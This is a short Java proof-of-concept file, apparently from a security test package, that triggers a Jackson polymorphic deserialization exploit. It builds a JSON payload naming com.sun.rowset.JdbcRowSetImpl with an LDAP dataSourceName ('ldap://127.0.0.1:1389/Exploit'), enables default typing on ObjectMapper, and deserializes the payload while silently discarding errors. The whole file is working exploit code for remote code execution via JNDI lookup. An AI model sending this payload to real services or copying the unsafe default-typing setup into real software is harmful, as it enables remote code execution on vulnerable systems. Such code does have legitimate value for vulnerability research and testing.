package com.test.jackson;

import com.fasterxml.jackson.databind.ObjectMapper;

public class JdbcRowSetImpl {

    public static void main(String[] args) {
        String payload = "[\"com.sun.rowset.JdbcRowSetImpl\",{\"dataSourceName\":\"ldap://127.0.0.1:1389/Exploit\",\"autoCommit\":true}]";
        System.out.println(payload);
        ObjectMapper mapper = new ObjectMapper();
        mapper.enableDefaultTyping();
        try {
            mapper.readValue(payload, Object.class);
        } catch (Throwable e) {

        }
    }
}
